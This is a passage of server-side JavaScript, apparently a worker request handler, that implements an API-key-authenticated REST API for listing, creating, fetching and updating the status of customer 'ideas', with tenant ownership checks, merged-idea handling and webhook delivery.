    // own, unlike the session-cookie routes above which take it as a param.
    if (url.pathname.startsWith("/api/v1/")) {
      const apiCustomerSlug = await requireApiKey(request, env);
      if (!apiCustomerSlug) {
        return json({ ok: false, error: "invalid or missing API key - use 'Authorization: Bearer rhk_...'" }, 401);
      }

      if (request.method === "GET" && url.pathname === "/api/v1/ideas") {
        try {
          const data = await callWorkflow(env, LIST_WORKFLOW_ID, { customerSlug: apiCustomerSlug });
          return json(data);
        } catch (err) {
          return json({ ok: false, error: err.message }, 502);
        }
      }

      if (request.method === "POST" && url.pathname === "/api/v1/ideas") {
        let body;
        try {
          body = await request.json();
        } catch {
          return json({ ok: false, error: "invalid JSON body" }, 400);
        }
        if (!body.title) {
          return json({ ok: false, error: "title is required" }, 400);
        }
        try {
          const endOrgId = await getTenantOrgId(env, apiCustomerSlug);
          let slackChannel;
          try {
            const settings = await callWorkflow(env, GET_CUSTOMER_SETTINGS_WORKFLOW_ID, { customerSlug: apiCustomerSlug });
            slackChannel = settings?.slackChannel || undefined;
          } catch {}
          const data = await callWorkflow(
            env,
            SUBMIT_WORKFLOW_ID,
            {
              customerSlug: apiCustomerSlug,
              title: body.title,
              description: body.description || "",
              category: body.category || "Feature",
              submitterEmail: body.submitterEmail || "",
              tags: Array.isArray(body.tags) ? body.tags : [],
              ...(slackChannel ? { slackChannel } : {}),
            },
            endOrgId
          );
          if (data?.idea) {
            deliverWebhooks(env, ctx, apiCustomerSlug, "idea.created", data.idea);
          }
          return json(data);
        } catch (err) {
          return json({ ok: false, error: err.message }, 502);
        }
      }

      const apiIdeaMatch = url.pathname.match(/^\/api\/v1\/ideas\/(\d+)$/);
      if (request.method === "GET" && apiIdeaMatch) {
        try {
          const data = await callWorkflow(env, LIST_WORKFLOW_ID, { customerSlug: apiCustomerSlug });
          const idea = (data?.ideas || []).find((i) => i.id === Number(apiIdeaMatch[1]));
          if (idea) return json({ ok: true, idea });
          // Not in the (merge-filtered) list doesn't distinguish "merged into
          // another idea" from "deleted" or "never existed" - a polling
          // integration needs that distinction to follow the merge instead
          // of treating it as data loss.
          const rawData = await callWorkflow(env, GET_IDEA_RAW_WORKFLOW_ID, {
            ideaId: Number(apiIdeaMatch[1]),
            customerSlug: apiCustomerSlug,
          });
          if (rawData?.ok && rawData.idea?.mergedInto) {
            return json({ ok: false, error: "idea was merged into another idea", mergedInto: rawData.idea.mergedInto }, 410);
          }
          return json({ ok: false, error: "idea not found" }, 404);
        } catch (err) {
          return json({ ok: false, error: err.message }, 502);
        }
      }

      const apiStatusMatch = url.pathname.match(/^\/api\/v1\/ideas\/(\d+)\/status$/);
      if (request.method === "POST" && apiStatusMatch) {
        let body;
        try {
          body = await request.json();
        } catch {
          return json({ ok: false, error: "invalid JSON body" }, 400);
        }
        if (!STATUSES.includes(body.status)) {
          return json({ ok: false, error: "status must be one of " + STATUSES.join(", ") }, 400);
        }
        try {
          const listData = await callWorkflow(env, LIST_WORKFLOW_ID, { customerSlug: apiCustomerSlug });
          const belongs = (listData?.ideas || []).some((i) => i.id === Number(apiStatusMatch[1]));
          if (!belongs) {
            const rawData = await callWorkflow(env, GET_IDEA_RAW_WORKFLOW_ID, {
              ideaId: Number(apiStatusMatch[1]),
              customerSlug: apiCustomerSlug,
            });
            if (rawData?.ok && rawData.idea?.mergedInto) {
              return json({ ok: false, error: "idea was merged into another idea", mergedInto: rawData.idea.mergedInto }, 410);
            }
            return json({ ok: false, error: "idea not found for this API key's tenant" }, 404);
          }
          const endOrgId = await getTenantOrgId(env, apiCustomerSlug);
          let settings = {};
          try {
            settings = await callWorkflow(env, GET_CUSTOMER_SETTINGS_WORKFLOW_ID, { customerSlug: apiCustomerSlug });
          } catch {}
          const data = await callWorkflow(
            env,
            UPDATE_STATUS_WORKFLOW_ID,
            {
              ideaId: Number(apiStatusMatch[1]),
              status: body.status,
              linearTeamId: settings?.linearTeamId || DEFAULT_LINEAR_TEAM_ID,
              notionPageId: settings?.notionPageId || DEFAULT_NOTION_PAGE_ID,
              linearStateIds: settings?.linearStateIds || {},
              baseUrl: url.origin,
            },
            endOrgId
          );
          if (data?.idea) {
            deliverWebhooks(env, ctx, apiCustomerSlug, "idea.status_changed", data.idea);
          }
          return json(data);
        } catch (err) {
          return json({ ok: false, error: err.message }, 502);
        }
      }

      return json({ ok: false, error: "not found" }, 404);
    }

    return new Response("Not found", { status: 404 });
  },
};
